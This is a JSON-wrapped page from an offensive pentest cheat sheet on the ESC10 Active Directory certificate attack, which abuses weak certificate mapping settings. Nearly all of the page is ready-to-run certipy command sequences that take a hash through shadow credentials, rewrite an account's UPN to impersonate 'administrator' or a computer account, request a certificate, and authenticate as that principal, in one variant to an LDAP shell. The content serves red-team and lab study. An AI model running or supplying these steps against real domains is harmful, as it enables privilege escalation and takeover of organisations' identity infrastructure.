{"title": "Ad Adcs Esc10", "source": "internal-att", "source_label": "InternalAllTheThings", "path": "active-directory/ad-adcs-esc10", "html": "<h1 id=\"active-directory-certificate-esc10\">Active Directory - Certificate ESC10</h1>\n<h2 id=\"esc10-weak-certificate-mapping-strongcertificatebindingenforcement\">ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement</h2>\n<p><strong>Requirements</strong>:</p>\n<ul>\n<li><code>StrongCertificateBindingEnforcement</code> = 0.</li>\n</ul>\n<p><strong>Exploit</strong>:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"c\"># get user hash with shadowcredentials</span>\n<span class=\"n\">certipy</span> <span class=\"n\">shadow</span> <span class=\"n\">auto</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-account</span> <span class=\"n\">admin</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># change user UPN</span>\n<span class=\"n\">certipy</span> <span class=\"n\">account</span> <span class=\"n\">update</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-user</span> <span class=\"n\">admin</span> <span class=\"n\">-upn</span> <span class=\"n\">administrator</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># ask for certificate</span>\n<span class=\"n\">certipy</span> <span class=\"n\">req</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;admin@domain.local&quot;</span> <span class=\"n\">-hashes</span> <span class=\"s2\">&quot;hashes&quot;</span> <span class=\"n\">-target</span> <span class=\"s2\">&quot;&lt;TARGET&gt;&quot;</span> <span class=\"n\">-ca</span> <span class=\"s1\">&#39;DOMAIN-CA&#39;</span> <span class=\"n\">-template</span> <span class=\"s1\">&#39;user&#39;</span> <span class=\"n\">-debug</span>\n\n<span class=\"c\"># Rollback upn modification</span>\n<span class=\"n\">certipy</span> <span class=\"n\">account</span> <span class=\"n\">update</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-user</span> <span class=\"n\">admin</span> <span class=\"n\">-upn</span> <span class=\"n\">admin</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># Connect with the certificate</span>\n<span class=\"n\">certipy</span> <span class=\"n\">auth</span> <span class=\"n\">-pfx</span> <span class=\"s1\">&#39;administrator.pfx&#39;</span> <span class=\"n\">-domain</span> <span class=\"s2\">&quot;domain.local&quot;</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h2 id=\"esc10-weak-certificate-mapping-certificatemappingmethods\">ESC10 – Weak Certificate Mapping - CertificateMappingMethods</h2>\n<p><strong>Requirements</strong>:</p>\n<ul>\n<li><code>CertificateMappingMethods</code> = 0x04.</li>\n</ul>\n<p><strong>Exploit</strong>:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">certipy</span> <span class=\"n\">shadow</span> <span class=\"n\">auto</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-account</span> <span class=\"n\">admin</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># change user UPN to computer$</span>\n<span class=\"n\">certipy</span> <span class=\"n\">account</span> <span class=\"n\">update</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-user</span> <span class=\"n\">admin</span> <span class=\"n\">-upn</span> <span class=\"s1\">&#39;computer$@domain.local&#39;</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># ask for certificate</span>\n<span class=\"n\">certipy</span> <span class=\"n\">req</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;admin@domain.local&quot;</span> <span class=\"n\">-hashes</span> <span class=\"s2\">&quot;3b60abbc25770511334b3829866b08f1&quot;</span> <span class=\"n\">-target</span> <span class=\"s2\">&quot;&lt;TARGET&gt;&quot;</span> <span class=\"n\">-ca</span> <span class=\"s1\">&#39;DOMAIN-CA&#39;</span> <span class=\"n\">-template</span> <span class=\"s1\">&#39;user&#39;</span> <span class=\"n\">-debug</span>\n\n<span class=\"c\"># Rollback upn modification</span>\n<span class=\"n\">certipy</span> <span class=\"n\">account</span> <span class=\"n\">update</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;user@domain.local&quot;</span> <span class=\"n\">-p</span> <span class=\"s2\">&quot;password&quot;</span> <span class=\"n\">-user</span> <span class=\"n\">admin</span> <span class=\"n\">-upn</span> <span class=\"n\">admin</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span>\n\n<span class=\"c\"># Connect via schannel with the certificate </span>\n<span class=\"n\">certipy</span> <span class=\"n\">auth</span> <span class=\"n\">-pfx</span> <span class=\"s1\">&#39;computer.pfx&#39;</span> <span class=\"n\">-domain</span> <span class=\"s2\">&quot;domain.local&quot;</span> <span class=\"n\">-dc-ip</span> <span class=\"p\">&lt;</span><span class=\"n\">TARGET</span><span class=\"p\">&gt;</span> <span class=\"n\">-ldap-shell</span>\n</code></pre></div>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://mayfly277.github.io/posts/ADCS-part14/\">GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025</a></li>\n</ul>", "excerpt": "Active Directory - Certificate ESC10 ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement Requirements : StrongCertificateBindingEnforcement = 0. Exploit : # get user hash with shado", "tags": []}